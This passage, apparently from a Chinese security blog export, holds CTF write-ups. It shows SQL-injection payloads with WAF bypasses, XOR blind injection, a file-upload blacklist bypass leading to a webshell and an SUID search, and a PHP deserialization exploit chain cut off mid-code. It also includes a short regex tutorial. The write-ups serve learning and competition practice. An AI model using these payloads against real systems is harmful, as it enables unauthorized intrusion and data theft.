<p>那么我们可以看见有一个注册页面，我们点击注册，然后登陆，我们可以看道，我们可以进行申请广告<br><br>这玩意一看就像是能注入的样子满脸写着，快来注入我呀。我们在广告名输入1’<br><br>发现直接报错我们在输入<br># 发现被过滤了，经过尝试题目拦截了空格，#，and和or，因为只要输入or就会被waf拦截导致无法发送也就造成了我们无法使用information_schema和order by<br>注释符我们可以使用%00截断法绕过，空格可以使用%0b和注释符/<strong>/绕过这里我就使用/ </strong>/因为%0b太难看了，而order by无法使用我们可以使用group_by来查询其列数<br>查询列数的payload<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/group_by/**/22;%00</span></span><br></pre></td></tr></table></figure><br>经过尝试我们可以发现其列数是22没错22列<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br><br>可以发现回显为是2和3<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br>回显其库名为web1我们在使用mysql.innodb_table_stats来查询表名payload如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br><br>接下来就是进行无列名注入了<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/1,(select/**/group_concat(a,b,c)/**/from/**/(select/**/1/**/as/**/a,2/**/as/**/b,3/**/as/**/c/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;%00</span></span><br></pre></td></tr></table></figure><br><br>嘿嘿flag get!!!!</p>
<h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><p>异或注入算是盲注的一种，我们在了解异或注入时先了解以下异或，所谓异或就是不同返回1相同返回0.那么就出现了1^0^1=0,1^1^1=1,那么就我们只要将中间的数字换成注入语句那么只要正确就会返回1错误就会返回0,payload如下<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">^</span>(ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>)<span class="operator">^</span><span class="number">1</span></span><br></pre></td></tr></table></figure><br>那么只要正确就返回1错误就返回0，这种注入方法可以应用用0于1回显界面不同的情况。<br>在判断是否为数字型注入的也可以使用^来注入<br>只要<code>1^1^1</code>和<code>1^0^1</code>的回显相同那么基本可以确认为字符型注入</p>
]]></content>
      <categories>
        <category>top10</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>极客大挑战</title>
    <url>/2024/10/31/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="072d8d0785f1482090f74046268ff78819faf0b5d4fb1117c7201f7e4c92c41c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">hint</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>正则表达式</title>
    <url>/2023/12/11/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<p>这个函数是个正则表达式，代码如下<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;查找到匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未发现匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>输出：查找到匹配的字符串 php<br>上面的代码的意思为：在后式的”PHP”中查找前式列出的字符串php,有则返回1无返回0<br>/php/两边的/是用于对字符串的分隔//后的i代表这是一个对大小写不敏感的查询所有这个会返回1就是真</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* 模式中的 \b 标记一个单词边界，所以只有独立的单词&quot;web&quot;会被匹配，而不会匹配</span><br><span class="line"> * 单词的部分内容比如&quot;webbing&quot; 或 &quot;cobweb&quot; */</span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;查找到匹配的字符串。\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;未发现匹配的字符串。\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;查找到匹配的字符串。\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;未发现匹配的字符串。\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查找到匹配的字符串。</span><br><span class="line">未发现匹配的字符串。</span><br></pre></td></tr></table></figure><br>在前式的字符串用/分隔字符串时可以添加\b来标记单词边界，只有独立的单词会被查询匹配</p>
<h1 id="正则表达式的几种修饰符"><a href="#正则表达式的几种修饰符" class="headerlink" title="正则表达式的几种修饰符"></a>正则表达式的几种修饰符</h1><p>i:忽略大小写的匹配<br>s:可以匹配任意字符包括换行符<br>m:可以采用多行识别,遇到换行也承认匹配规则<br>x:忽略掉规则模式中的空白字符<br>a:强制从头开始匹配<br>u:禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</p>
]]></content>
      <tags>
        <tag>php函数</tag>
      </tags>
  </entry>
  <entry>
    <title>校赛wp</title>
    <url>/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/</url>
    <content><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>队伍名：啦啦啦啦</p>
<p>队伍成员：</p>
<p>LSE（2023级）</p>
<p>HBQ（2023级）</p>
<p>ZWK（2023级）</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>解题：LSE<br>F12打开源码搜索100000会发现base64编码直接解码就是flag<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/1.png" class="" title="alt text"><br>或者直接使用控制台来调用js函数<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/sign_in2.png" class="" title="alt text"></p>
<h2 id="PermissionDenied"><a href="#PermissionDenied" class="headerlink" title="PermissionDenied"></a>PermissionDenied</h2><p>解题人：LSE<br>这题一打开就是文件上传，我们直接自己写一个html的文件上传文件<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://node5.anna.nssctf.cn:28191/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;pHp&quot;</span>,<span class="string">&quot;pHp5&quot;</span>,<span class="string">&quot;pHp4&quot;</span>,<span class="string">&quot;pHp3&quot;</span>,<span class="string">&quot;pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;Html&quot;</span>,<span class="string">&quot;Htm&quot;</span>,<span class="string">&quot;pHtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;jSp&quot;</span>,<span class="string">&quot;jSpx&quot;</span>,<span class="string">&quot;jSpa&quot;</span>,<span class="string">&quot;jSw&quot;</span>,<span class="string">&quot;jSv&quot;</span>,<span class="string">&quot;jSpf&quot;</span>,<span class="string">&quot;jHtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;aSp&quot;</span>,<span class="string">&quot;aSpx&quot;</span>,<span class="string">&quot;aSa&quot;</span>,<span class="string">&quot;aSax&quot;</span>,<span class="string">&quot;aScx&quot;</span>,<span class="string">&quot;aShx&quot;</span>,<span class="string">&quot;aSmx&quot;</span>,<span class="string">&quot;cEr&quot;</span>,<span class="string">&quot;sWf&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$deny_ext</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">blacklist</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$filecontent</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Success!!!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们查看源码可以看到我们发送的文件，后端并没有将结尾的一些特殊字符进行截取，这就导致了我们可以尝试一些添加后缀的方法进行绕过，我这里使用的是/.来进行绕过（建议使用url编码）<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/upload-1.png" class="" title="alt text"><br>我们用蚁剑连接，打开终端发现无法进行命令执行<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-2.png" class="" title="alt text"><br>打开phpinfo会发现很多禁用方法<br>我们使用插件绕过<br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-3.png" class="" title="alt text"><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-4.png" class="" title="alt text"><br>这时我们仍然无法进行查看flag，我们可以尝试提权，我们查找具有suid权限的文件<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><br><img src="/2024/03/04/%E6%A0%A1%E8%B5%9Bwp/up-5.png" class="" title="alt text"><br>会发现一个每见过的，我们直接尝试运行会发现直接弹出了flag<br>我个人认为这道题目的目的是为了让我学习提权，但学长怕难度太高于是就整了这么一出</p>
<h2 id="ezzz-unserialize"><a href="#ezzz-unserialize" class="headerlink" title="ezzz_unserialize"></a>ezzz_unserialize</h2><p>解题人：LSE<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoNo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$peach</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; peach = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasaraKing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$orange</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cherry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span> -&gt; orange;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; cherry -&gt; <span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UkyoTachibana</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$banana</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mangosteen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span> -&gt; banana -&gt; <span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; mangosteen -&gt; tt2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sakura was the best!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UesugiErii</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$coconut</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My time with Sakura was my happiest time&quot;</span>.<span class="variable language_">$this</span> -&gt; coconut;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaiSakatoku</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Carambola</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kiwifruit</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; <span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span> -&gt; Kiwifruit = <span class="string">&quot;Sakura&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt; Carambola);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这题因为我找不到原生类，一开始可是折磨死我了。这题我们看到没有后门函数所以我们需要使用php原生类来进行命令执行，我们先寻找链尾巴，发现链尾大概率为<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>因为最后一句<code>echo ($Thursday.&#39;&lt;br&gt;&#39;)</code>会触发原生类。我们来分析运行这个方法。<br><code>array_walk($this, function ($Monday, $Tuesday)</code>这个方法是将我们的属性的变量名和内容分别传到 <code>$Tuesday和$Monday</code>，之后再创建一个新的实例对象。 <code>$Tuesday($Monday)</code><br>我们这时候就可以控制<code>$Tuesday和$Monday</code>的值将<code>$Tuesday($Monday)</code>变为DirectoryIterator(/)就可以查看其目录的内容了。我这里直接贴一篇学长的原生类文章吧。<a href="https://hyggevv.github.io/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">原生类</a></p>
<p>既然找的了链尾巴我们就继续反回去找，仔细查看会发现整条链为<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sakura&#123;__destruct&#125;-&gt;Sakura&#123;__toString&#125;-&gt;Heraclqs&#123;__invoke()&#125;-&gt;E&#123;__get($arg1)&#125;</span><br></pre></td></tr></table></figure><br>这就是整条利用链了注意在Heraclqs我们需要绕过md5值我这里脚本找不到了，在网上随便搜也能搜到我就不贴了<br>下面是exp<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sakura</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$apple</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$strawberry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; apple = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; apple;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; strawberry;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$DirectoryIterator</span>=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$Monday</span>, <span class="variable">$Tuesday</span>) &#123;</span><br><span class="line">            <span class="variable">$Wednesday</span> = <span class="keyword">new</span> <span class="variable">$Tuesday</span>(<span class="variable">$Monday</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span 